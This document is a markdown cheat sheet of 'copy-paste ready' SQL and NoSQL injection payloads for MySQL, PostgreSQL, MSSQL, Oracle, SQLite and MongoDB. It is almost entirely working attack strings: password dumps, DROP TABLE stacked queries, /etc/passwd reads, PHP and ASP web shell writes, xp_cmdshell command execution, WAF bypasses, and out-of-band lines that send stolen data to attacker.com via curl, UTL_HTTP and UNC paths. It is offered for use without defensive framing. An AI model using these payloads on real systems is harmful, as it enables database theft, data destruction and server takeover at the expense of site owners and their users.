# SQL Injection Payloads by Database Dialect

> Copy-paste ready payloads organized by DBMS. Replace `INJECT` with your injection point.
> `--` comments assume MySQL; adjust for target (e.g., `--` needs trailing space in MySQL).

---

## MySQL

### Detection

#### Boolean-Based
```
' OR 1=1-- -
' OR 1=2-- -
' AND 1=1-- -
' AND 1=2-- -
" OR 1=1-- -
') OR 1=1-- -
')) OR 1=1-- -
' OR 'a'='a
' OR 'a'='b
1 OR 1=1
1 AND 1=1
1 AND 1=2
```

#### Time-Based
```
' OR SLEEP(5)-- -
' AND SLEEP(5)-- -
" OR SLEEP(5)-- -
') OR SLEEP(5)-- -
1 OR SLEEP(5)
' AND (SELECT SLEEP(5) FROM dual)-- -
' OR BENCHMARK(10000000,SHA1('test'))-- -
' AND IF(1=1,SLEEP(5),0)-- -
' AND IF(1=2,SLEEP(5),0)-- -
```

#### Error-Based
```
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))-- -
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)-- -
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -
' AND EXP(~(SELECT * FROM (SELECT version())a))-- -
' AND GTID_SUBSET(CONCAT(0x7e,(SELECT version()),0x7e),1)-- -
' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,version(),0x7e)) USING utf8)))-- -
```

#### UNION-Based
```
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL-- -
' UNION SELECT 1,2,3-- -
' UNION SELECT 1,version(),3-- -
' UNION ALL SELECT 1,2,3-- -
' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -
```

### Information Gathering

#### Version & User
```
SELECT version()
SELECT @@version
SELECT user()
SELECT current_user()
SELECT system_user()
SELECT @@hostname
SELECT @@datadir
SELECT @@basedir
```

#### Databases
```
SELECT schema_name FROM information_schema.schemata
SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata
SELECT database()
```

#### Tables
```
SELECT table_name FROM information_schema.tables WHERE table_schema=database()
SELECT GROUP_CONCAT(table_name SEPARATOR 0x0a) FROM information_schema.tables WHERE table_schema=database()
SELECT table_name FROM information_schema.tables WHERE table_schema='target_db'
```

#### Columns
```
SELECT column_name FROM information_schema.columns WHERE table_name='users'
SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users' AND table_schema=database()
SELECT column_name,data_type FROM information_schema.columns WHERE table_name='users'
```

#### Data Extraction
```
SELECT GROUP_CONCAT(username,0x3a,password SEPARATOR 0x0a) FROM users
SELECT CONCAT(username,':',password) FROM users LIMIT 0,1
```

### Advanced

#### Stacked Queries
```
'; DROP TABLE users-- -
'; INSERT INTO users(username,password) VALUES('evil','evil')-- -
'; UPDATE users SET password='hacked' WHERE username='admin'-- -
'; CREATE TABLE pwned(data TEXT)-- -
```

#### Out-of-Band (OOB)
```
' AND LOAD_FILE(CONCAT('\\\\',version(),'.attacker.com\\a'))-- -
' AND (SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\a')))-- -
SELECT * INTO OUTFILE '\\\\attacker.com\\share\\output.txt' FROM users-- -
```

#### File Read
```
' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3-- -
' UNION SELECT 1,LOAD_FILE(0x2f6574632f706173737764),3-- -
' UNION SELECT 1,LOAD_FILE('/var/www/html/config.php'),3-- -
```

#### File Write
```
' UNION SELECT 1,'<?php system($_GET["cmd"]);?>',3 INTO OUTFILE '/var/www/html/shell.php'-- -
' UNION SELECT 1,0x3c3f706870206576616c28245f4745545b27636d64275d293b3f3e,3 INTO OUTFILE '/var/www/html/cmd.php'-- -
' UNION SELECT "",2,3 INTO DUMPFILE '/var/www/html/shell.php'-- -
```

#### Command Execution (UDF)
```
SELECT sys_exec('id');
SELECT sys_eval('whoami');
```

### Context-Specific

#### String Context
```
' OR '1'='1
' AND '1'='1
' AND SUBSTRING(version(),1,1)='5
\' OR 1=1-- -
```

#### Numeric Context
```
1 OR 1=1
1 AND 1=1
1-IF(1=1,SLEEP(5),0)
1 DIV 1
1 DIV 0
```

#### ORDER BY Context
```
1,(SELECT SLEEP(5))
1,EXTRACTVALUE(1,CONCAT(0x7e,version()))
IF(1=1,id,username)
(CASE WHEN (1=1) THEN id ELSE username END)
```

#### IN Clause
```
1) OR 1=1-- -
1) AND 1=2 UNION SELECT 1,2,3-- -
```

#### INSERT/UPDATE Context
```
','','')-- -
' OR '1'='1','injection')-- -
' AND EXTRACTVALUE(1,CONCAT(0x7e,version())) OR '
```

### WAF Bypasses

#### Case Variation
```
' uNiOn SeLeCt 1,2,3-- -
' UnIoN/**/sElEcT 1,2,3-- -
```

#### Comment Obfuscation
```
' UN/**/ION SEL/**/ECT 1,2,3-- -
' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3-- -
' /*!UNION*/ /*!SELECT*/ 1,2,3-- -
' /**/UNION/**/SELECT/**/1,2,3-- -
' UNION%0aSELECT%0a1,2,3-- -
' UNION%09SELECT%091,2,3-- -
' UNION%0dSELECT%0d1,2,3-- -
```

#### Encoding
```
%27%20OR%201%3D1--%20-
%252727%2520OR%25201%253D1
' OR 1=1-- - (double URL encode: %2527%2520OR%25201%253D1)
```

#### Alternative Functions
```
' OR MID(version(),1,1)='5
' OR SUBSTR(version(),1,1)='5
' OR LEFT(version(),1)='5
' OR ORD(MID(version(),1,1))=53
' OR ASCII(SUBSTRING(version(),1,1))=53
```

#### No Spaces
```
'OR(1=1)#
'AND(SELECT(1))#
'UNION(SELECT(1),(2),(3))#
'OR'1'='1
```

#### No Quotes
```
1 OR 1=1
1 UNION SELECT 1,CHAR(97,100,109,105,110),3
1 UNION SELECT 1,0x61646d696e,3
```

---

## PostgreSQL

### Detection

#### Boolean-Based
```
' OR 1=1--
' AND 1=1--
' OR true--
' AND true--
' OR ''='
```

#### Time-Based
```
' OR pg_sleep(5)--
' AND pg_sleep(5)--
'; SELECT pg_sleep(5)--
' AND (SELECT pg_sleep(5))--
' || pg_sleep(5)--
' AND 1=(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE 1 END)--
' AND 1=(SELECT CASE WHEN (1=2) THEN pg_sleep(5) ELSE 1 END)--
```

#### Error-Based
```
' AND 1=CAST((SELECT version()) AS int)--
' AND 1::int=CAST((SELECT version()) AS int)--
' AND CAST((SELECT version()) AS numeric)--
',CAST((SELECT version()) AS int))--
' AND (SELECT CASE WHEN (1=1) THEN CAST(1/0 AS text) ELSE '' END)='1
```

#### UNION-Based
```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1,version(),3--
' UNION ALL SELECT NULL,NULL,NULL--
```

### Information Gathering

#### Version & User
```
SELECT version()
SELECT current_user
SELECT session_user
SELECT current_database()
SELECT inet_server_addr()
SELECT inet_server_port()
```

#### Databases
```
SELECT datname FROM pg_database
SELECT string_agg(datname,',') FROM pg_database
```

#### Tables
```
SELECT tablename FROM pg_tables WHERE schemaname='public'
SELECT table_name FROM information_schema.tables WHERE table_schema='public'
SELECT string_agg(tablename,',') FROM pg_tables WHERE schemaname='public'
```

#### Columns
```
SELECT column_name FROM information_schema.columns WHERE table_name='users'
SELECT string_agg(column_name,',') FROM information_schema.columns WHERE table_name='users'
SELECT attname FROM pg_attribute WHERE attrelid='users'::regclass AND attnum>0
```

### Advanced

#### Stacked Queries
```
'; DROP TABLE users--
'; CREATE TABLE pwned(data text)--
'; INSERT INTO pwned SELECT version()--
'; COPY pwned FROM '/etc/passwd'--
```

#### Out-of-Band
```
'; COPY (SELECT version()) TO PROGRAM 'curl http://attacker.com/?v='||version()--
'; DO $$ BEGIN PERFORM dblink_connect('host=attacker.com dbname=test'); END $$--
SELECT dblink_send_query('host=attacker.com','SELECT version()')
```

#### File Read
```
'; CREATE TABLE tmp(data text); COPY tmp FROM '/etc/passwd'--
SELECT pg_read_file('/etc/passwd',0,1000)
SELECT lo_import('/etc/passwd')
```

#### File Write
```
'; COPY (SELECT '<?php system($_GET["cmd"]);?>') TO '/var/www/html/shell.php'--
SELECT lo_export(12345,'/tmp/shell.php')
```

#### Command Execution
```
'; COPY pwned FROM PROGRAM 'id'--
'; CREATE TABLE cmd_output(txt text); COPY cmd_output FROM PROGRAM 'id'--
SELECT * FROM cmd_output;
'; CREATE OR REPLACE FUNCTION cmd(text) RETURNS void AS $$ BEGIN PERFORM system($1); END; $$ LANGUAGE plpgsql; SELECT cmd('id')--
```

### WAF Bypasses
```
' OR/**/1=1--
' UNION/**/SELECT/**/NULL,version(),NULL--
' OR$$true$$--
' OR$tag$true$tag$--
CHR(65)||CHR(66)  -- string without quotes
' UNION SELECT 1,CHR(118)||CHR(101)||CHR(114),3--
```

---

## Microsoft SQL Server (MSSQL)

### Detection

#### Boolean-Based
```
' OR 1=1--
' AND 1=1--
' OR 1=1;--
') OR 1=1--
```

#### Time-Based
```
'; WAITFOR DELAY '0:0:5'--
' AND 1=1 WAITFOR DELAY '0:0:5'--
'; IF (1=1) WAITFOR DELAY '0:0:5'--
'; IF (1=2) WAITFOR DELAY '0:0:5'--
' AND (SELECT COUNT(*) FROM sysusers AS sys1, sysusers AS sys2, sysusers AS sys3)>0--
```

#### Error-Based
```
' AND 1=CONVERT(int,(SELECT @@version))--
' AND 1=CONVERT(int,(SELECT DB_NAME()))--
' AND 1=CONVERT(int,(SELECT user_name()))--
' HAVING 1=1--
' GROUP BY columnname HAVING 1=1--
```

#### UNION-Based
```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1,@@version,3--
' UNION ALL SELECT 1,'a',3--
```

### Information Gathering

#### Version & User
```
SELECT @@version
SELECT SYSTEM_USER
SELECT USER_NAME()
SELECT ORIGINAL_LOGIN()
SELECT DB_NAME()
SELECT @@SERVERNAME
SELECT HOST_NAME()
SELECT IS_SRVROLEMEMBER('sysadmin')
```

#### Databases
```
SELECT name FROM sys.databases
SELECT name FROM master.dbo.sysdatabases
SELECT DB_NAME(0)
SELECT DB_NAME(1)
```

#### Tables
```
SELECT name FROM sysobjects WHERE xtype='U'
SELECT table_name FROM information_schema.tables
SELECT name FROM sys.tables
```

#### Columns
```
SELECT column_name FROM information_schema.columns WHERE table_name='users'
SELECT name FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')
SELECT c.name FROM sys.columns c JOIN sys.tables t ON c.object_id=t.object_id WHERE t.name='users'
```

### Advanced

#### Stacked Queries
```
'; EXEC sp_makewebtask 'C:\inetpub\wwwroot\shell.asp','SELECT 1'--
'; EXEC master..xp_cmdshell 'whoami'--
'; EXEC xp_cmdshell 'dir C:\'--
```

#### Enable xp_cmdshell
```
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE--
'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--
'; EXEC master..xp_cmdshell 'whoami'--
```

#### Out-of-Band
```
'; EXEC master..xp_dirtree '\\attacker.com\share'--
'; DECLARE @q VARCHAR(1024); SET @q='\\'+CONVERT(VARCHAR(32),(SELECT @@version))+'.attacker.com\a'; EXEC master..xp_dirtree @q--
'; SELECT * FROM OPENROWSET('SQLOLEDB','server=attacker.com;uid=sa;pwd=','SELECT 1')--
```

#### File Read
```
SELECT * FROM OPENROWSET(BULK 'C:\Windows\win.ini',SINGLE_CLOB) AS x
CREATE TABLE #tmp(data VARCHAR(MAX)); BULK INSERT #tmp FROM 'C:\Windows\win.ini'; SELECT * FROM #tmp
```

#### File Write
```
'; EXEC xp_cmdshell 'echo ^<%25eval request("cmd")%25^> > C:\inetpub\wwwroot\shell.asp'--
'; EXEC sp_makewebtask 'C:\inetpub\wwwroot\out.html','SELECT * FROM users'--
```

#### Linked Servers
```
SELECT * FROM OPENQUERY([linked_server],'SELECT @@version')
EXEC ('xp_cmdshell ''whoami''') AT [linked_server]
SELECT * FROM master.dbo.sysdatabases
```

### WAF Bypasses
```
' uNiOn%0aSeLeCt 1,2,3--
' UNION SELECT 1,2,3--  (use tab %09 instead of space)
';EXEC('xp_cm'+'dshell ''whoami''')--
';EXEC(CHAR(120)+CHAR(112)+CHAR(95)+CHAR(99)+CHAR(109)+CHAR(100)+CHAR(115)+CHAR(104)+CHAR(101)+CHAR(108)+CHAR(108)+CHAR(32)+CHAR(39)+CHAR(105)+CHAR(100)+CHAR(39))--
' OR 1=1--  → URL: %27%20OR%201%3D1%2D%2D
```

---

## Oracle

### Detection

#### Boolean-Based
```
' OR 1=1--
' AND 1=1--
' OR 'a'='a
' AND ROWNUM=1--
```

#### Time-Based
```
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
' AND 1=(SELECT CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 1 END FROM dual)--
' AND UTL_INADDR.GET_HOST_ADDRESS('sleep5.attacker.com')='1'--
```

#### Error-Based
```
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--
' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))--
' AND EXTRACTVALUE(XMLType('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://'||(SELECT banner FROM v$version WHERE ROWNUM=1)||'.attacker.com/">%remote;]>'),'/l')='1'--
' AND 1=CAST((SELECT banner FROM v$version WHERE ROWNUM=1) AS int)--
```

#### UNION-Based
```
' UNION SELECT NULL FROM dual--
' UNION SELECT NULL,NULL FROM dual--
' UNION SELECT 1,banner,3 FROM v$version WHERE ROWNUM=1--
```

### Information Gathering

#### Version & User
```
SELECT banner FROM v$version WHERE ROWNUM=1
SELECT version FROM v$instance
SELECT user FROM dual
SELECT SYS_CONTEXT('USERENV','CURRENT_USER') FROM dual
SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM dual
SELECT SYS_CONTEXT('USERENV','HOST') FROM dual
SELECT ora_database_name FROM dual
```

#### Tables
```
SELECT table_name FROM all_tables
SELECT table_name FROM user_tables
SELECT owner,table_name FROM all_tables WHERE owner='SCHEMA_NAME'
```

#### Columns
```
SELECT column_name FROM all_tab_columns WHERE table_name='USERS'
SELECT column_name,data_type FROM user_tab_columns WHERE table_name='USERS'
```

### Advanced

#### Out-of-Band
```
SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual)) FROM dual
SELECT HTTPURITYPE('http://attacker.com/'||(SELECT user FROM dual)).GETCLOB() FROM dual
SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)||'.attacker.com') FROM dual
SELECT DBMS_LDAP.INIT((SELECT user FROM dual)||'.attacker.com',80) FROM dual
```

#### File Read
```
SELECT UTL_FILE.GET_LINE(UTL_FILE.FOPEN('/etc','passwd','R'),buffer) FROM dual
CREATE DIRECTORY ext AS '/etc'; SELECT * FROM EXTERNAL_TABLE
SELECT * FROM v$logfile
```

#### Command Execution (Java)
```
SELECT DBMS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper /bin/id') FROM dual
-- Requires CREATE PROCEDURE and Java permissions
```

### WAF Bypasses
```
' OR/**/1=1--
' UNION/**/SELECT/**/NULL,banner,NULL/**/FROM/**/v$version--
q'|text|'  -- alternative quoting
CHR(65)||CHR(66)  -- string without quotes
```

---

## SQLite

### Detection

#### Boolean-Based
```
' OR 1=1--
' AND 1=1--
' OR '1'='1
```

#### Time-Based (limited)
```
' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--
' AND 1=randomblob(100000000)--
```

#### Error-Based
```
' AND CAST((SELECT sql FROM sqlite_master LIMIT 1) AS int)--
' AND 1=LOAD_EXTENSION('/tmp/evil')--
```

#### UNION-Based
```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT 1,sqlite_version(),3--
' UNION SELECT 1,sql,3 FROM sqlite_master--
```

### Information Gathering

#### Version
```
SELECT sqlite_version()
```

#### Tables
```
SELECT name FROM sqlite_master WHERE type='table'
SELECT sql FROM sqlite_master WHERE type='table'
SELECT GROUP_CONCAT(name) FROM sqlite_master WHERE type='table'
```

#### Columns
```
SELECT sql FROM sqlite_master WHERE name='users'
PRAGMA table_info(users)
```

### Advanced

#### File Read (via ATTACH)
```
ATTACH DATABASE '/etc/passwd' AS pw
SELECT * FROM pw.sqlite_master
```

#### File Write
```
ATTACH DATABASE '/var/www/html/shell.php' AS evil; CREATE TABLE evil.pwn(data text); INSERT INTO evil.pwn VALUES('<?php system($_GET["c"]);?>');--
```

#### Stacked Queries
```
'; ATTACH DATABASE '/tmp/test.db' AS test--
'; CREATE TABLE test.pwn(data text)--
```

---

## MongoDB (NoSQL Injection)

### Detection

#### Authentication Bypass
```json
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
{"username": {"$exists": true}, "password": {"$exists": true}}
```

#### URL Parameter Injection
```
username[$ne]=x&password[$ne]=x
username[$gt]=&password[$gt]=
username[$regex]=.*&password[$regex]=.*
username[$exists]=true&password[$exists]=true
username[$nin][]=invalid&password[$nin][]=invalid
```

#### Operator Injection
```json
{"$where": "1==1"}
{"$where": "sleep(5000)"}
{"username": {"$regex": "^admin"}}
{"username": {"$regex": "^a"}, "password": {"$gt": ""}}
```

### Information Gathering

#### Enumerate Users (Boolean)
```json
{"username": {"$regex": "^a"}}
{"username": {"$regex": "^ad"}}
{"username": {"$regex": "^adm"}}
{"username": {"$regex": "^admi"}}
{"username": {"$regex": "^admin"}}
```

#### Enumerate Passwords (Boolean)
```json
{"username": "admin", "password": {"$regex": "^p"}}
{"username": "admin", "password": {"$regex": "^pa"}}
{"username": "admin", "password": {"$regex": "^pas"}}
```

#### Extract via $where
```json
{"$where": "this.username=='admin' && this.password.length > 5"}
{"$where": "this.username=='admin' && this.password[0]=='p'"}
```

### Advanced

#### Server-Side JavaScript
```json
{"$where": "function(){return true}"}
{"$where": "function(){sleep(5000);return true}"}
{"$where": "function(){var x=new Date();while(new Date()-x<5000);return true}"}
```

#### Command Execution via $where (old versions)
```json
{"$where": "function(){var x=new java.lang.ProcessBuilder; x.command('id'); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())}"}
```

#### Aggregation Pipeline
```json
[{"$lookup": {"from": "admin_collection", "localField": "_id", "foreignField": "_id", "as": "leaked"}}]
[{"$unionWith": "sensitive_collection"}]
```

### WAF Bypasses
```
%24ne → $ne
%24gt → $gt
%24regex → $regex
%24where → $where
username[\u0024ne]= → unicode escape
{"username": {"$\u006ee": ""}} → unicode in key
```

---

## Cross-Database Techniques

### Detecting DBMS Type
```
' AND 'foo'+'bar'='foobar'--          (MSSQL/MySQL concat)
' AND 'foo'||'bar'='foobar'--         (Oracle/PostgreSQL concat)
' AND CONCAT('foo','bar')='foobar'--  (MySQL)
' AND 1=CONVERT(int,@@version)--      (MSSQL)
' AND 1=CAST(version() AS int)--      (PostgreSQL)
' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))-- (Oracle)
```

### Universal Time Delays
```
MySQL:      ' AND SLEEP(5)-- -
PostgreSQL: ' AND pg_sleep(5)--
MSSQL:      '; WAITFOR DELAY '0:0:5'--
Oracle:     ' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1--
SQLite:     ' AND 1=LIKE('A',UPPER(HEX(RANDOMBLOB(500000000))))--
```

### Second-Order Injection
```
-- Register username: admin'-- -
-- Application stores it, then uses in: SELECT * FROM users WHERE username='admin'-- -'
-- Register username: ' UNION SELECT 1,2,3-- -
-- Application reconstructs query with stored value
```

### Filter Bypass Cheatsheet
| Blocked    | Alternative                                         |
|-----------|-----------------------------------------------------|
| `SELECT`  | `SeLeCt`, `%53ELECT`, `/*!SELECT*/`                |
| `UNION`   | `UNI%6FN`, `UN/**/ION`                             |
| space     | `/**/`, `%09`, `%0a`, `%0d`, `+`, `()`            |
| `'`       | `%27`, double-encode, char(), hex                   |
| `=`       | `LIKE`, `REGEXP`, `BETWEEN x AND x`, `IN(x)`      |
| `OR`      | `||`, `%7C%7C`                                      |
| `AND`     | `&&`, `%26%26`                                      |
| `WHERE`   | `HAVING`                                            |
| `,`       | `OFFSET`, `FROM`, `JOIN`                            |
| `#`       | `-- -`, `;%00`                                      |

---

## Payload Generation Tips

### Identifying Column Count
```
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -
...increment until error...

' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
...add NULLs until no error...
```

### Identifying Visible Columns
```
' UNION SELECT 'a',NULL,NULL-- -
' UNION SELECT NULL,'a',NULL-- -
' UNION SELECT NULL,NULL,'a'-- -
```

### Extracting Multiple Values
```
MySQL:      GROUP_CONCAT(col1,0x3a,col2 SEPARATOR 0x0a)
PostgreSQL: string_agg(col1||':'||col2, E'\n')
MSSQL:      col1+':'+col2 (use FOR XML PATH for concat)
Oracle:     LISTAGG(col1||':'||col2,CHR(10)) WITHIN GROUP (ORDER BY 1)
```

### Conditional Responses
```
MySQL:      IF(condition,true_val,false_val)
PostgreSQL: CASE WHEN condition THEN true_val ELSE false_val END
MSSQL:      CASE WHEN condition THEN true_val ELSE false_val END
Oracle:     CASE WHEN condition THEN true_val ELSE false_val END
IIF:        IIF(condition,true_val,false_val)  -- MSSQL 2012+
```
